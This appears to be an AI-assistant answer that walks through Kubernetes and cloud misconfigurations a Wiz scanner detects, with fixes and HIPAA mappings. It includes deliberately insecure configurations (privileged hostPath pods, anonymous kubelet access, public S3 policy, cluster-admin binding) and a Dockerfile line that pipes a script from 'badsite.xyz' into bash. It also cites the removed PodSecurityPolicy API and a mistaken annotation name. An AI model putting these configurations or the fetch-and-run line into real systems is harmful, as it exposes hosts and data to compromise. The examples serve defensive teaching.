| 📦 **Category**             | 🔍 Example Use Cases                                   |
| --------------------------- | ------------------------------------------------------ |
| **Kubernetes Security**     | Privileged pods, exposed kubelets, bad ingress configs |
| **Cloud Risk Correlation**  | Exposed S3 bucket → pod → IAM role → data breach path  |
| **CI/CD & Image Security**  | CVEs in base images, untrusted registries, no scanning |
| **Compliance & Visibility** | HIPAA mapping, RBAC audit, attack path visualizations  |


---

## 🚨 1. Privileged Pod with HostPath Mount

This pod has:

* `privileged: true` (gives root access to host)
* Mounts host filesystem using `hostPath`

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: insecure-pod
  labels:
    app: bad-app
spec:
  containers:
  - name: root-container
    image: busybox
    command: ["sleep", "3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-volume
  volumes:
  - name: host-volume
    hostPath:
      path: /
      type: Directory
```

✅ **Wiz Detection:**

* Privileged container
* HostPath mount
* Exploit path if pod is exposed or compromised

---

## 🚨 2. Exposed Kubelet – Read-Only Port Enabled

This flag is often present on the **kubelet config** (not pod YAML), but for awareness, here's what to look for in a kubelet configuration file or arguments:

```bash
# Bad kubelet flags (passed in systemd or kubelet config file)
--anonymous-auth=true
--read-only-port=10255
--authorization-mode=AlwaysAllow
```

✅ **Wiz Detection:**

* Open kubelet port without authentication
* Anyone can list pods, access logs, or probe health endpoints

🛡️ **Fix:**

* Set `--read-only-port=0`
* Use `--authorization-mode=Webhook`
* Set `--anonymous-auth=false`

---

## 🚨 3. Bad Ingress Configuration (Unrestricted to Public)

This Ingress exposes an internal app to the public without auth or network policies:

```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: open-ingress
  annotations:
    nginx.ingress.kubernetes.io/rewrite-target: /
spec:
  rules:
  - host: myinternalapp.example.com
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: internal-service
            port:
              number: 80
```

✅ **Wiz Detection:**

* No `networkPolicy` protecting backend service
* No `auth` annotation (e.g., basic auth or OIDC)
* Internet-facing DNS + known container vulnerabilities → full attack path

🛡️ **Fix:**

* Restrict ingress with allowlist CIDRs or `nginx.ingress.kubernetes.io/whitelist-source-range`
* Apply `networkPolicy` to restrict pod access
* Enforce authentication

---

### 🔁 Want to practice detection?

You can feed these YAMLs into:

* OPA Gatekeeper policies
* Admission controllers
* Wiz sandbox (if available) for simulated scanning

Let me know if you want the **fixed versions**, or if you'd like these turned into a validation policy or Helm lint rule set!


Absolutely — this is one of the most powerful examples of **Wiz's cloud-Kubernetes correlation** capability. Let’s walk through:

---

# ☁️ Cloud Risk Correlation Example

### ⚠️ Scenario:

An **exposed S3 bucket** is accessible from a **Kubernetes pod** via an **IAM role**. This creates a data breach risk path:

```
Internet → Pod (via public Ingress) → IAM Role → S3 (with PHI)
```

---

## 🔧 Step-by-Step YAML + Infra Example

---

### 1️⃣ **Kubernetes Pod with ServiceAccount (linked to IAM Role)**

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: s3-access-pod
  labels:
    app: test-app
spec:
  serviceAccountName: s3-access-sa
  containers:
  - name: app
    image: amazonlinux
    command: ["sleep", "3600"]
```

---

### 2️⃣ **Kubernetes ServiceAccount**

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: s3-access-sa
  annotations:
    eks.amazonaws.com/role-arn: arn:aws:iam::123456789012:role/PodS3AccessRole
```

This annotation links the pod to an AWS IAM Role via **IRSA** (IAM Roles for Service Accounts).

---

### 3️⃣ **IAM Role (PodS3AccessRole)**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": ["s3:GetObject", "s3:ListBucket"],
      "Resource": [
        "arn:aws:s3:::sensitive-data-bucket",
        "arn:aws:s3:::sensitive-data-bucket/*"
      ]
    }
  ]
}
```

---

### 4️⃣ **S3 Bucket Policy (Exposed!)**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "PublicRead",
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::sensitive-data-bucket/*"
    }
  ]
}
```

> ⚠️ This makes the bucket *publicly accessible*.

---

## 🧠 How Wiz Correlates It

Wiz automatically connects the dots:

1. **S3 scan** → Bucket is public and contains PII/PHI markers.
2. **IAM graph** → Finds the role (`PodS3AccessRole`) with access to the bucket.
3. **Kubernetes graph** → Detects a pod linked to that role (via `eks.amazonaws.com/role-arn`).
4. **Network scan** → Pod is exposed via public Ingress or has outbound internet.

🔺 **Wiz generates an attack path**:

> “This publicly accessible pod can retrieve PHI from a misconfigured S3 bucket.”

---

## 🛡️ How to Fix It

### 🔐 1. Secure the S3 Bucket

Remove the public read policy:

```json
"Principal": {
  "AWS": "arn:aws:iam::123456789012:role/PodS3AccessRole"
}
```

Only allow access from trusted roles.

---

### 🔐 2. Use Least Privilege IAM

Restrict actions to exact S3 keys needed. Avoid `*` in `Resource`.

---

### 🔐 3. Limit Pod Exposure

* Use `NetworkPolicy` to block egress to internet.
* Remove public Ingress if not needed.
* Add mTLS or identity-based authentication.

---

### 🔐 4. Add Detection Controls

* Use OPA/Gatekeeper policies to block service accounts with `iam.amazonaws.com/role-arn`.
* Use Wiz to alert when cloud → pod → data correlations are detected.

---

## ✅ Summary

This example is **realistic, common**, and **highly valued** in Wiz interviews because it shows:

* Cross-layer detection (Cloud + K8s)
* Real data exposure risk
* How Wiz connects attack paths that other tools miss

Absolutely — let’s walk through a practical **CI/CD & Image Security scenario** that tools like **Wiz** are built to detect and prioritize:

---

# 🔐 CI/CD & Image Security Example

### ⚠️ Problem:

A developer pushes a container to production with:

* A **vulnerable base image** (with CVEs)
* Pulled from an **untrusted public registry**
* No image scanning or deployment policy to block it

---

## 🛠️ Scenario Breakdown

```
Dev pushes image → Built with vulnerable Alpine → Pulled from Docker Hub → No admission control → Deployed to cluster
```

---

## 1️⃣ Vulnerable Deployment YAML

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: cve-app
spec:
  replicas: 1
  selector:
    matchLabels:
      app: cve-app
  template:
    metadata:
      labels:
        app: cve-app
    spec:
      containers:
      - name: vulnerable-container
        image: docker.io/library/alpine:3.10
        command: ["sh", "-c", "sleep 3600"]
```

### 🔎 What’s wrong:

* `alpine:3.10` is **old and has critical CVEs** (e.g., musl, openssl bugs)
* From public Docker Hub (`docker.io/library`)
* No label or signature verification
* No runtime admission check

✅ **Wiz will scan the image registry**, detect:

* CVEs based on known vulnerabilities
* Untrusted source (public registry)
* No SBOM, signature, or policy enforcement

---

## 2️⃣ Helm/CI Build Pulling Image from Untrusted Source

Sample Dockerfile:

```Dockerfile
FROM alpine:3.10

RUN apk add --no-cache curl bash && \
    curl -s https://badsite.xyz/install.sh | bash

CMD ["sleep", "3600"]
```

This does 3 risky things:

* Uses old Alpine
* Installs unverified shell script
* No lockfile or hash pinning

---

## 3️⃣ No Image Scanning in CI (GitHub Actions)

```yaml
name: Build & Push

on:
  push:
    branches: [ main ]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3
    - name: Build Docker Image
      run: docker build -t my-org/cve-app:latest .
    - name: Push to Registry
      run: docker push my-org/cve-app:latest
```

> ⚠️ This build pipeline lacks:

* Image scanning (Trivy, Grype, etc.)
* SBOM generation
* Registry validation
* Signature signing (cosign/sigstore)

---

## 🧠 How Wiz Helps

Wiz scans both:

1. **Image registries** — to find CVEs, untrusted origins, unscanned images
2. **Running workloads** — to link images to real risk paths

Then it **prioritizes risks** like:

* Image with CVEs deployed in production
* Pod with access to secrets or cloud IAM roles
* Workload with outbound internet → vulnerable app

---

## 🛡️ How to Fix

### ✔️ Use Trusted Base Images

Replace Alpine 3.10 with an LTS minimal image:

```Dockerfile
FROM cgr.dev/chainguard/alpine-base:latest
```

Or:

```Dockerfile
FROM gcr.io/distroless/static:nonroot
```

---

### ✔️ Enforce Image Scanning in CI

Example using **Trivy** in GitHub Actions:

```yaml
- name: Scan image with Trivy
  uses: aquasecurity/trivy-action@master
  with:
    image-ref: my-org/cve-app:latest
    format: table
```

---

### ✔️ Use Admission Controller (Kyverno or Gatekeeper)

Block risky images at deploy time:

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: block-untrusted-registry
spec:
  validationFailureAction: enforce
  rules:
    - name: validate-registry
      match:
        resources:
          kinds:
            - Pod
      validate:
        message: "Only images from internal registry are allowed"
        pattern:
          spec:
            containers:
              - image: "my-registry.myorg.com/*"
```

---

### 🧠 Bonus: What Wiz Surfaces

> “This pod runs a container built from `docker.io/alpine:3.10`, with critical CVEs (CVSS > 9.0), deployed in the production namespace, and has access to an AWS role with S3 read/write.”

⚠️ That’s an **exploitable path** — not just a vulnerability. That’s what sets Wiz apart.

---

Absolutely — here’s a complete breakdown of how **Wiz enhances Compliance & Visibility** in a Kubernetes and cloud-native environment, with a focus on **HIPAA**, **RBAC auditing**, and **attack path visualizations**.

---

# ✅ Compliance & Visibility Example (HIPAA, RBAC, Attack Path)

---

## ⚠️ Scenario

You’re a healthcare SaaS provider running workloads on AWS EKS and Kubernetes.
Your audit team needs:

* Evidence of HIPAA controls in place (e.g., encrypted storage, RBAC enforcement)
* Verification that sensitive workloads are isolated
* Full visibility into how a vulnerability could lead to **PHI exposure**

---

## 🗂️ Example 1: Kubernetes Workload With Missing RBAC Controls

### ⚠️ Problematic RoleBinding

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: allow-everything
  namespace: prod
subjects:
- kind: User
  name: dev-admin
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
```

### 🔎 What's wrong:

* Dev user gets **cluster-admin** access in a production namespace
* No scoping or separation of duty
* Potential violation of HIPAA §164.308 (least privilege access)

✅ **Wiz Detection:**

* Finds RBAC misconfigurations
* Maps “who has access to what” (User → Role → Secrets/Pods)

---

### ✔️ Fixed RoleBinding (Principle of Least Privilege)

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: readonly-pods
  namespace: prod
subjects:
- kind: User
  name: dev-ops
roleRef:
  kind: Role
  name: view-pods
  apiGroup: rbac.authorization.k8s.io
```

---

## 🗃️ Example 2: Enforcing Encrypted Storage (HIPAA 164.312(a)(2)(iv))

```yaml
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: secure-pvc
spec:
  accessModes:
    - ReadWriteOnce
  storageClassName: encrypted-gp2
  resources:
    requests:
      storage: 10Gi
```

> Make sure `encrypted-gp2` is backed by an **EBS volume with encryption enabled**.

✅ **Wiz Detection:**

* Pulls cloud-native disk metadata
* Flags if volumes used by workloads **aren’t encrypted**
* Maps it back to HIPAA 164.312 compliance gaps

---

## 🔍 Example 3: Visualizing an Attack Path (Graph-Based)

**Attack Path Wiz Might Visualize:**

```
Internet → Ingress → Pod (running as root) → Mounted Secret → AWS IAM Role → S3 with PHI
```

### How?

* **Wiz risk graph** connects:

  * Network exposure
  * Pod runtime config
  * ServiceAccount + IAM permissions
  * Cloud storage targets (S3 buckets)

✅ Results:

* Graph view of all **chained misconfigs**
* Prioritized by *real exploitable paths*
* Helps pass audits by proving no direct risk to PHI

---

## 🛡️ Example 4: Enforcing Policies (Admission Controller / Gatekeeper)

### Block pods that run as root (HIPAA safeguard: prevent unauthorized access)

```yaml
apiVersion: policy/v1
kind: PodSecurityPolicy
metadata:
  name: no-root-access
spec:
  privileged: false
  runAsUser:
    rule: MustRunAsNonRoot
  seLinux:
    rule: RunAsAny
```

📝 Use OPA Gatekeeper or Kyverno to enforce this cluster-wide.

---

## 📈 How Wiz Maps to HIPAA Controls

| HIPAA Safeguard                       | Wiz Detection Capability                                      |
| ------------------------------------- | ------------------------------------------------------------- |
| §164.308(a)(1)(ii)(A) – Risk Analysis | Graph-based risk visualization, prioritized by exploitability |
| §164.312(a)(2)(iv) – Encryption       | Scans for unencrypted cloud disks and unencrypted S3 buckets  |
| §164.308(a)(4) – Access Control       | Detects overly permissive RBAC, IAM access paths              |
| §164.312(d) – Person/entity auth      | Detects shared kubeconfigs, anonymous access to API/kubelet   |

---

## 🧠 Summary

**Wiz gives auditors, security, and engineers:**

* A **visual map** of how vulnerabilities → real data exposure
* Cross-layer correlation (K8s + IAM + storage)
* Continuous HIPAA and SOC2 posture tracking
* Built-in reports mapped to compliance frameworks

---

